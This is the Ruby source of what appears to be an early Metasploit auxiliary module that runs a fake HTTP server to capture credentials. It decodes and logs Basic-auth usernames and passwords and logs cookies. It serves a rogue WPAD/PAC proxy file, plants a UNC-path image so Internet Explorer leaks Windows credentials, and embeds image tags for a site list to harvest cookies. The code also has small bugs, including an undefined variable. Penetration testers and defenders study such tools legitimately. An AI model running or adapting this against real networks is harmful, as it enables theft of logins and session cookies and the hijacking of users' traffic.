##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary

	include Exploit::Remote::TcpServer
	include Auxiliary::Report

	
	def initialize
		super(
			'Name'        => 'Authentication Capture: HTTP',
			'Version'     => '$Revision$',
			'Description'    => %q{
				This module provides a fake HTTP service that
			is designed to capture authentication credentials.
			},
			'Author'      => ['ddz', 'hdm'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Capture' ]
				],
			'PassiveActions' => 
				[
					'Capture'
				],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
				OptPath.new('TEMPLATE',   [ false, "The HTML template to serve in responses", 
						File.join(Msf::Config.install_root, "data", "exploits", "capture", "http", "index.html")
					]
				),
				OptPath.new('SITELIST',   [ false, "The list of URLs that should be used for cookie capture", 
						File.join(Msf::Config.install_root, "data", "exploits", "capture", "http", "sites.txt")
					]
				)
			], self.class)
	end

	def setup
		super
		@state = {}
	end

	def run
		@template = datastore['TEMPLATE']
		@sitelist = datastore['SITELIST']
		@myhost   = datastore['SRVHOST']
		@myport   = datastore['SRVPORT']
		exploit()
	end
	
	def on_client_connect(c)
		@state[c.peerhost] ||= {
			:ip    => c.peerhost, 
			:sites => {}
		}
		c.extend(Rex::Proto::Http::ServerClient)
		c.init_cli(self)
	end
	
	def on_client_data(cli)

		begin
			data = cli.get_once(-1, 5)
			case cli.request.parse(data)
			
				when Rex::Proto::Http::Packet::ParseCode::Completed
					dispatch_request(cli, cli.request)

					cli.reset_cli
				when  Rex::Proto::Http::Packet::ParseCode::Error
					close_client(cli)
			end
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::OpenSSL::SSL::SSLError
		rescue ::Exception
			print_status("Error: #{$!.class} #{$!} #{$!.backtrace}")
		end
		
		close_client(cli)						
	end

	def close_client(cli)
		cli.close
	end
	
	def dispatch_request(cli, req)
		
		os_name = nil
		os_type = nil
		os_vers = nil
		os_arch = 'x86'
		
		ua_name = nil
		ua_vers = nil
		
		ua = req['User-Agent']

		case (ua) 
			when /rv:([\d\.]+)/
				ua_name = 'FF'
				ua_vers = $1
			when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]\.[0-9]+)/:
				ua_name = 'IE'
				ua_vers = $1
			when /Version\/(\d+\.\d+\.\d+).*Safari/
				ua_name = 'Safari'
				ua_vers = $1
		end
		
		case (ua)
			when /Windows/
				os_name = 'Windows'
			when /Linux/
				os_name = 'Linux'
			when /iPhone/
				os_name = 'iPhone'
				os_arch = 'armle'
			when /Mac OS X/
				os = 'Mac'
		end
		
		case (ua)
			when /PPC/
				os_arch = 'ppc'
		end
		
		os_name ||= 'Unknown'
		
		mysrc = Rex::Socket.source_address(cli.peerhost)
		hhead = (req['Host'] || @myhost).split(':', 2)[0]


		cookies = req['Cookies'] || ''
		

		if(req['Authorization'] and req['Authorization'] =~ /basic/i)
			basic,auth = req['Authorization'].split(/\s+/)
			user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
			report_auth_info(
				:host      => cli.peerhost,
				:proto     => 'http',
				:targ_host => hhead,
				:targ_port => @myport,
				:user      => user,
				:pass      => pass,
				:extra     => req.resource.to_s
			)
			print_status("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
		end
		
		
		if(req.resource =~ /\.eml$/) 
				eml = "To: User\r\nFrom: Support\r\nSubject: Failed to connect\r\n\r\nInternet access has been prohibited by the administrator\r\n"
				res = 
				"HTTP/1.1 200 OK\r\n" +
				"Host: #{hhead}\r\n" +
				"Content-Type: message/rfc822\r\n" +
				"Content-Length: #{eml.length}\r\n" +
				"Connection: Close\r\n\r\n#{eml}"
			print_status("HTTP EML sent to #{cli.peerhost}")
			cli.put(res)
			return	
			
		end
		
		if(req.resource =~ /^wpad.dat|.*\.pac$/i) 
			prx = "function FindProxyForURL(url, host) { return 'PROXY #{mysrc}:#{@myport}'; }"
			res = 
				"HTTP/1.1 200 OK\r\n" +
				"Host: #{hhead}\r\n" +
				"Content-Type: application/x-ns-proxy-autoconfig\r\n" +
				"Content-Length: #{prx.length}\r\n" +
				"Connection: Close\r\n\r\n#{prx}"
			print_status("HTTP wpad.dat sent to #{cli.peerhost}")
			cli.put(res)
			return
		end
		
		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers} cookies=#{cookies}")
		
		
		# The google maps / stocks view on the iPhone
		if (req['Host'] == 'iphone-wu.apple.com')
			case req.resource
			when '/glm/mmap'
				print_status("HTTP #{cli.peerhost} is using Google Maps on the iPhone")
			when '/dgw'
				print_status("HTTP #{cli.peerhost} is using Stocks/Weather on the iPhone")
			else
				print_status("HTTP #{cli.peerhost} is request #{req.resource} via the iPhone")
			end
		end
		
		# The itunes store on the iPhone
		if(req['Host'] == 'phobos.apple.com') 
			print_status("HTTP #{cli.peerhost} is using iTunes Store on the iPhone")
			# GET /bag.xml
		end


		# Handle image requests
		ctypes  =
		{
    		   "jpg"   => "image/jpeg",
    		   "jpeg"  => "image/jpeg",
    		   "png"   => "image/png",
    		   "gif"   => "image/gif",
		}
		
		req_ext = req.resource.split(".")[-1].downcase
		
		if(ctypes[req_ext])
			ctype = ctypes[img_ext] || ctypes["jpg"]
			res =
    			   "HTTP/1.1 200 OK\r\n" +
    			   "Host: #{mysrc}\r\n" +
    			   "Content-Type: #{ctype}\r\n" +
    			   "Content-Length: 0\r\n" +
    			   "Connection: Close\r\n\r\n"

			cli.put(res)
			return
		end

		
		buff = ''
		
		if(ua_name == "IE")
			buff << "<img src='\\\\#{mysrc}\\public#{Time.now.to_i.to_s}\\loading.jpg' width='1' height='1'>"
		end

		list = File.readlines(@sitelist)
		list.each do |site|
			next if site =~ /^#/
			site.strip!
			next if site.length == 0
			buff << "<img src='http://#{site}/pixel.gif'>"
		end

		data = File.read(@template)
		data.gsub!(/%CONTENT%/, buff)
				
		res  = 
			"HTTP/1.1 200 OK\r\n" +
			"Host: #{mysrc}\r\n" +
			"Expires: 0\r\n" +
			"Cache-Control: must-revalidate\r\n" +
			"Content-Type: text/html\r\n" +
			"Content-Length: #{data.length}\r\n" +
			"Connection: Close\r\n\r\n#{data}"

		cli.put(res)
		return		
	
	end

end
end
